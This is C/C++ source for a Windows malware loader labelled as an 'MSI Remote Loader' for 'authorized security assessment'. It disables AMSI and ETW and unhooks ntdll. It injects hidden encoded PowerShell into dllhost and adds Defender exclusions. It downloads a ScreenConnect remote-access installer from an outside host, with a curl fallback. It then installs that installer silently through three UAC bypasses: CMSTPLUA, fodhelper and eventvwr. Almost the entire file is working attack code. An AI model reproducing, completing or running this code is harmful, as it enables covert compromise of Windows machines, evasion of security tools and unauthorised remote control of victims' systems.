/*
 * MSI Remote Loader - Silent UAC Bypass (No Prompt) - 3 Methods
 * Authorized Security Assessment Use Only
 */

#define _WIN32_WINNT 0x0602
#define _WIN32_IE 0x0600
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <shlwapi.h>
#include <urlmon.h>
#include <shlobj.h>

#ifdef __MINGW32__
#  include <winternl.h>
#  pragma GCC diagnostic push
#  pragma GCC diagnostic ignored "-Wunused-parameter"
#  pragma GCC diagnostic ignored "-Wunused-function"
#  pragma GCC diagnostic ignored "-Waddress"
#  pragma GCC diagnostic ignored "-Warray-bounds"
#else
#  include <winternl.h>
#endif

/* ============================================================
   NT API DECLARATIONS
   ============================================================ */
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

typedef VOID (NTAPI *fnRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);
typedef NTSTATUS (NTAPI *fnNtOpenSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *fnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fnNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *fnNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *fnNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, LPTHREAD_START_ROUTINE, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

/* ============================================================
   XOR STRING OBFUSCATION
   ============================================================ */
#define XOR_KEY 0xAA

static inline void XorStringA(char* str, size_t len) {
    for (size_t i = 0; i < len; i++) str[i] ^= XOR_KEY;
}

static inline char* DecryptStr(char* enc, size_t len) {
    for (size_t i = 0; i < len; i++) enc[i] ^= XOR_KEY;
    return enc;
}

char g_amsiDll[]    = "\xc2\xcd\xcb\xc9\x2e\xcc\xcc\xcb\x00";
char g_amsiFunc[]   = "\xc2\xcd\xcb\xc9\x52\xdb\xc1\xc2\xcd\x42\xcf\xdd\x5e\x00";
char g_ntdllStr[]   = "\xcd\xde\xcc\xcc\xcb\x2e\xcc\xcc\xcb\x00";

/* ============================================================
   CLSID/IID DEFINITIONS
   ============================================================ */
static const CLSID CLSID_CMSTPLUA =
    { 0x3E5FC7F9, 0x9A51, 0x4367, { 0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7 } };
static const IID IID_ICMLuaUtil =
    { 0x6EDD6D74, 0xC007, 0x4E75, { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C } };

/* ============================================================
   ICMLuaUtil INTERFACE
   ============================================================ */
typedef struct ICMLuaUtilVtbl ICMLuaUtilVtbl;
typedef struct ICMLuaUtil {
    ICMLuaUtilVtbl* lpVtbl;
} ICMLuaUtil;

struct ICMLuaUtilVtbl {
    HRESULT (STDMETHODCALLTYPE* QueryInterface)(ICMLuaUtil*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE* AddRef)(ICMLuaUtil*);
    ULONG   (STDMETHODCALLTYPE* Release)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method1)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method2)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method3)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method4)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method5)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method6)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* ShellExec)(ICMLuaUtil*, LPCWSTR lpFile,
        LPCWSTR lpParameters, LPCWSTR lpDirectory, ULONG fMask, ULONG nShow);
    HRESULT (STDMETHODCALLTYPE* Method8)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method9)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method10)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method11)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method12)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method13)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* CallCustomActionDll)(ICMLuaUtil*,
        LPCWSTR dllPath, LPCWSTR funcName, LPCWSTR param3, LPCWSTR param4, ULONG* outParam);
    HRESULT (STDMETHODCALLTYPE* Method15)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method16)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method17)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method18)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method19)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE* Method20)(ICMLuaUtil*);
};

/* ============================================================
   BASE64
   ============================================================ */
static const char b64t[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string Base64Encode(const BYTE* data, size_t len) {
    std::string r;
    int i = 0, j = 0;
    BYTE a3[3], a4[4];
    while (len--) {
        a3[i++] = *data++;
        if (i == 3) {
            a4[0] = (a3[0] & 0xfc) >> 2;
            a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
            a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
            a4[3] = a3[2] & 0x3f;
            for (i = 0; i < 4; i++) r += b64t[a4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) a3[j] = '\0';
        a4[0] = (a3[0] & 0xfc) >> 2;
        a4[1] = ((a3[0] & 0x03) << 4) + ((a3[1] & 0xf0) >> 4);
        a4[2] = ((a3[1] & 0x0f) << 2) + ((a3[2] & 0xc0) >> 6);
        a4[3] = a3[2] & 0x3f;
        for (j = 0; j < i + 1; j++) r += b64t[a4[j]];
        while (i++ < 3) r += '=';
    }
    return r;
}

/* ============================================================
   AMSI PATCH
   ============================================================ */
static void PatchAMSI() {
    char aDll[32], aFunc[32];
    memcpy(aDll, g_amsiDll, sizeof(g_amsiDll));
    memcpy(aFunc, g_amsiFunc, sizeof(g_amsiFunc));
    DecryptStr(aDll, sizeof(g_amsiDll)-1);
    DecryptStr(aFunc, sizeof(g_amsiFunc)-1);

    HMODULE hAmsi = LoadLibraryA(aDll);
    if (!hAmsi) return;

    FARPROC pAmsiScanBuf = GetProcAddress(hAmsi, aFunc);
    if (!pAmsiScanBuf) return;

    DWORD op;
    VirtualProtect((LPVOID)pAmsiScanBuf, 6, PAGE_EXECUTE_READWRITE, &op);
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy((void*)pAmsiScanBuf, patch, 6);
    VirtualProtect((LPVOID)pAmsiScanBuf, 6, op, &op);
}

/* ============================================================
   ETW PATCH
   ============================================================ */
static void PatchETW() {
    char ntdll[16];
    memcpy(ntdll, g_ntdllStr, sizeof(g_ntdllStr));
    DecryptStr(ntdll, sizeof(g_ntdllStr)-1);

    HMODULE hNt = GetModuleHandleA(ntdll);
    if (!hNt) return;

    FARPROC p1 = GetProcAddress(hNt, "EtwEventWrite");
    if (p1) {
        DWORD op;
        VirtualProtect((LPVOID)p1, 1, PAGE_EXECUTE_READWRITE, &op);
        *(BYTE*)p1 = 0xC3;
        VirtualProtect((LPVOID)p1, 1, op, &op);
    }

    FARPROC p2 = GetProcAddress(hNt, "EtwEventWriteTransfer");
    if (p2) {
        DWORD op;
        VirtualProtect((LPVOID)p2, 1, PAGE_EXECUTE_READWRITE, &op);
        *(BYTE*)p2 = 0xC3;
        VirtualProtect((LPVOID)p2, 1, op, &op);
    }
}

/* ============================================================
   NTDLL UNHOOK
   ============================================================ */
static void UnhookNtdll() {
    char ntdllStr[16];
    memcpy(ntdllStr, g_ntdllStr, sizeof(g_ntdllStr));
    DecryptStr(ntdllStr, sizeof(g_ntdllStr)-1);

    HMODULE hNt = GetModuleHandleA(ntdllStr);
    if (!hNt) return;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    fnRtlInitUnicodeString RtlInitUnicodeString = (fnRtlInitUnicodeString)
        GetProcAddress(hNtdll, "RtlInitUnicodeString");
    fnNtOpenSection NtOpenSection = (fnNtOpenSection)
        GetProcAddress(hNtdll, "NtOpenSection");
    fnNtMapViewOfSection NtMapViewOfSection = (fnNtMapViewOfSection)
        GetProcAddress(hNtdll, "NtMapViewOfSection");
    fnNtUnmapViewOfSection NtUnmapViewOfSection = (fnNtUnmapViewOfSection)
        GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    fnNtClose NtClose = (fnNtClose)
        GetProcAddress(hNtdll, "NtClose");

    if (!RtlInitUnicodeString || !NtOpenSection || !NtMapViewOfSection ||
        !NtUnmapViewOfSection || !NtClose) {
        goto disk_fallback;
    }

    {
        HANDLE hSection = NULL;
        OBJECT_ATTRIBUTES oa;
        UNICODE_STRING us;

        RtlInitUnicodeString(&us, L"\\KnownDlls\\ntdll.dll");
        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, NULL, NULL);

        NTSTATUS status = NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
        if (NT_SUCCESS(status) && hSection) {
            LPVOID mappedView = NULL;
            SIZE_T viewSize = 0;
            status = NtMapViewOfSection(hSection, GetCurrentProcess(),
                &mappedView, 0, 0, NULL, &viewSize, 2, 0, PAGE_READONLY);

            if (NT_SUCCESS(status) && mappedView) {
                PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)mappedView;
                if (dh->e_magic == IMAGE_DOS_SIGNATURE) {
                    PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((BYTE*)mappedView + dh->e_lfanew);
                    if (nth->Signature == IMAGE_NT_SIGNATURE) {
                        PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(nth);
                        for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++) {
                            if (memcmp(sh[i].Name, ".text", 5) == 0) {
                                LPVOID txtLocal = (BYTE*)hNt + sh[i].VirtualAddress;
                                SIZE_T sz = sh[i].SizeOfRawData;
                                DWORD op;
                                if (VirtualProtect(txtLocal, sz, PAGE_EXECUTE_READWRITE, &op)) {
                                    memcpy(txtLocal, (BYTE*)mappedView + sh[i].PointerToRawData, sz);
                                    VirtualProtect(txtLocal, sz, op, &op);
                                }
                                break;
                            }
                        }
                    }
                }
                NtUnmapViewOfSection(GetCurrentProcess(), mappedView);
            }
            NtClose(hSection);
            return;
        }
    }

disk_fallback:
    {
        HANDLE hF = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
            GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hF == INVALID_HANDLE_VALUE) return;

        HANDLE hM = CreateFileMappingA(hF, NULL, PAGE_READONLY, 0, 0, NULL);
        if (!hM) { CloseHandle(hF); return; }
        LPVOID fNt = MapViewOfFile(hM, FILE_MAP_READ, 0, 0, 0);
        if (!fNt) { CloseHandle(hM); CloseHandle(hF); return; }

        PIMAGE_DOS_HEADER dh = (PIMAGE_DOS_HEADER)fNt;
        if (dh->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS nth = (PIMAGE_NT_HEADERS)((BYTE*)fNt + dh->e_lfanew);
            if (nth->Signature == IMAGE_NT_SIGNATURE) {
                PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(nth);
                for (WORD i = 0; i < nth->FileHeader.NumberOfSections; i++) {
                    if (memcmp(sh[i].Name, ".text", 5) == 0) {
                        LPVOID txt = (BYTE*)hNt + sh[i].VirtualAddress;
                        SIZE_T sz = sh[i].SizeOfRawData;
                        DWORD op;
                        if (VirtualProtect(txt, sz, PAGE_EXECUTE_READWRITE, &op)) {
                            memcpy(txt, (BYTE*)fNt + sh[i].PointerToRawData, sz);
                            VirtualProtect(txt, sz, op, &op);
                        }
                        break;
                    }
                }
            }
        }

        UnmapViewOfFile(fNt);
        CloseHandle(hM);
        CloseHandle(hF);
    }
}

/* ============================================================
   DOWNLOAD MSI FROM URL
   ============================================================ */
static bool DownloadMSI(const char* url, WCHAR* outPath, SIZE_T outSize) {
    IStream* stream = NULL;
    HRESULT hr = URLOpenBlockingStreamA(NULL, url, &stream, 0, NULL);
    if (FAILED(hr) || !stream) return false;

    // Save to Temp directory
    WCHAR tmpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    wsprintfW(outPath, L"%sSC_%08X.msi", tmpPath, GetTickCount());

    HANDLE hF = CreateFileW(outPath, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hF == INVALID_HANDLE_VALUE) { stream->Release(); return false; }

    BYTE buf[8192];
    ULONG rd;
    while (SUCCEEDED(stream->Read(buf, sizeof(buf), &rd)) && rd > 0) {
        DWORD wr;
        WriteFile(hF, buf, rd, &wr, NULL);
    }

    CloseHandle(hF);
    stream->Release();
    return true;
}

/* ============================================================
   UAC BYPASS #1: CMSTPLUA (Silent - No Prompt)
   ============================================================ */
static bool UACBypassCMSTPLUA(const wchar_t* exePath, const wchar_t* args) {
    HRESULT hr;
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (!SUCCEEDED(hr) && hr != RPC_E_CHANGED_MODE) return false;

    WCHAR monikerStr[512];
    wcscpy(monikerStr, L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");

    BIND_OPTS3 bop;
    ZeroMemory(&bop, sizeof(bop));
    bop.cbStruct = sizeof(bop);
    bop.dwClassContext = CLSCTX_LOCAL_SERVER;

    ICMLuaUtil* pUtil = NULL;
    hr = CoGetObject(monikerStr, (BIND_OPTS*)&bop, IID_ICMLuaUtil, (void**)&pUtil);

    if (!SUCCEEDED(hr) || !pUtil) {
        CoUninitialize();
        return false;
    }

    HRESULT hrExec;
    if (args && lstrlenW(args) > 0) {
        hrExec = pUtil->lpVtbl->ShellExec(pUtil, exePath, args, NULL, SEE_MASK_DEFAULT, SW_HIDE);
    } else {
        hrExec = pUtil->lpVtbl->ShellExec(pUtil, exePath, NULL, NULL, SEE_MASK_DEFAULT, SW_HIDE);
    }

    pUtil->lpVtbl->Release(pUtil);
    CoUninitialize();
    return SUCCEEDED(hrExec);
}

/* ============================================================
   UAC BYPASS #2: FodHelper / ComputerDefaults (Silent)
   ============================================================ */
static bool UACBypassFodHelper(const wchar_t* exePath, const wchar_t* args) {
    // Uses "fodhelper.exe" UAC bypass - no prompt
    HKEY hKey;
    DWORD dwDisposition;

    // Create registry key: HKCU\Software\Classes\ms-settings\shell\open\command
    LSTATUS status = RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition);
    if (status != ERROR_SUCCESS) return false;

    // Build the full command line
    WCHAR cmdLine[1024];
    if (args && lstrlenW(args) > 0) {
        wsprintfW(cmdLine, L"\"%s\" %s", exePath, args);
    } else {
        wcscpy(cmdLine, exePath);
    }

    // Set (Default) value to our command
    RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)cmdLine, (lstrlenW(cmdLine) + 1) * 2);

    // Set DelegateExecute to empty
    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE*)L"", 2);

    RegCloseKey(hKey);

    // Execute fodhelper - this will launch our command as admin silently
    SHELLEXECUTEINFOW sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"open";
    sei.lpFile = L"fodhelper.exe";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);

    // Clean up registry after a short delay
    Sleep(5000);
    RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\shell\\open\\command");

    return true;
}

/* ============================================================
   UAC BYPASS #3: Event Viewer / SDCLT (Silent)
   ============================================================ */
static bool UACBypassEventViewer(const wchar_t* exePath, const wchar_t* args) {
    // Uses "eventvwr.exe" and "sdclt.exe" UAC bypass
    HKEY hKey;
    DWORD dwDisposition;

    // Create: HKCU\Software\Classes\mscfile\shell\open\command
    RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Classes\\mscfile\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &dwDisposition);

    WCHAR cmdLine[1024];
    if (args && lstrlenW(args) > 0) {
        wsprintfW(cmdLine, L"\"%s\" %s", exePath, args);
    } else {
        wcscpy(cmdLine, exePath);
    }

    RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)cmdLine, (lstrlenW(cmdLine) + 1) * 2);
    RegCloseKey(hKey);

    // Launch eventvwr - will execute our command as admin
    SHELLEXECUTEINFOW sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = L"open";
    sei.lpFile = L"eventvwr.exe";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);

    // Clean up
    Sleep(5000);
    RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile");

    return true;
}

/* ============================================================
   EXECUTE POWERSHELL THROUGH DLLHOST (System Process)
   ============================================================ */
static void ExecPowerShellDllhost(const wchar_t* psCommand) {
    // Find or spawn dllhost
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (lstrcmpiW(pe.szExeFile, L"dllhost.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    if (!pid) {
        // Spawn new dllhost
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
        if (!CreateProcessW(L"C:\\Windows\\System32\\dllhost.exe", NULL, NULL, NULL,
            FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) return;
        pid = pi.dwProcessId;
        ResumeThread(pi.hThread);
        Sleep(500);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // Encode PowerShell command in Base64
    char cmdA[8192] = {0};
    WideCharToMultiByte(CP_UTF8, 0, psCommand, -1, cmdA, sizeof(cmdA), NULL, NULL);
    std::string b64 = Base64Encode((BYTE*)cmdA, strlen(cmdA));
    std::string fullCmd = "powershell -NoP -NonI -W Hidden -Enc " + b64;

    // Inject into dllhost
    HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hp) return;

    LPVOID rm = VirtualAllocEx(hp, NULL, fullCmd.size() + 1, MEM_COMMIT, PAGE_READWRITE);
    if (!rm) { CloseHandle(hp); return; }

    WriteProcessMemory(hp, rm, fullCmd.c_str(), fullCmd.size() + 1, NULL);

    FARPROC winExec = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec");
    if (winExec) {
        HANDLE ht = CreateRemoteThread(hp, NULL, 0, (LPTHREAD_START_ROUTINE)winExec, rm, 0, NULL);
        if (ht) {
            WaitForSingleObject(ht, 15000);
            CloseHandle(ht);
        }
    }

    VirtualFreeEx(hp, rm, 0, MEM_RELEASE);
    CloseHandle(hp);
}

/* ============================================================
   Add Defender Exclusion via PowerShell
   ============================================================ */
static void AddDefenderExclusion() {
    const wchar_t* psCmd =
        L"Add-MpPreference -ExclusionExtension exe -Force; "
        L"Add-MpPreference -ExclusionPath 'C:\\Temp' -Force; "
        L"Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp' -Force";
    ExecPowerShellDllhost(psCmd);
}

/* ============================================================
   WINMAIN — SILENT UAC BYPASS MSI LOADER
   ============================================================ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
    (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;

    HWND cw = GetConsoleWindow();
    if (cw) ShowWindow(cw, SW_HIDE);

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    /* STEP 1: EVASION */
    PatchAMSI();
    PatchETW();
    UnhookNtdll();

    /* STEP 2: Add Windows Defender exclusion silently */
    AddDefenderExclusion();

    /* STEP 3: Download MSI */
    WCHAR msiPath[MAX_PATH] = {0};
    bool downloaded = DownloadMSI(
        "https://iowu.mine.nu/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=Touu&c=&c=&c=&c=&c=&c=&c=",
        msiPath, MAX_PATH);

    if (!downloaded) {
        // Fallback: use PowerShell to download
        const wchar_t* psDownload =
            L"curl.exe -L 'https://iowu.mine.nu/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=Touu&c=&c=&c=&c=&c=&c=&c=' -o 'C:\\Temp\\SC.msi' 2>$null";
        ExecPowerShellDllhost(psDownload);
        Sleep(15000); // Wait for download
        wcscpy(msiPath, L"C:\\Temp\\SC.msi");
    }

    /* STEP 4: UAC BYPASS - TRY ALL METHODS SILENTLY */
    WCHAR cmdLine[1024];
    wsprintfW(cmdLine, L"/i \"%s\" /qn /norestart", msiPath);

    // Method 1: CMSTPLUA COM (most reliable)
    bool elevated = UACBypassCMSTPLUA(L"msiexec.exe", cmdLine);

    if (!elevated) {
        // Method 2: FodHelper (no prompt)
        elevated = UACBypassFodHelper(L"msiexec.exe", cmdLine);
    }

    if (!elevated) {
        // Method 3: Event Viewer
        elevated = UACBypassEventViewer(L"msiexec.exe", cmdLine);
    }

    /* STEP 5: FALLBACK - Run through dllhost */
    if (!elevated) {
        WCHAR psRun[1024];
        wsprintfW(psRun,
            L"Start-Process msiexec.exe -ArgumentList '/i \"%s\" /qn /norestart' -WindowStyle Hidden -Verb RunAs",
            msiPath);
        ExecPowerShellDllhost(psRun);
    }

    CoUninitialize();
    return 0;
}
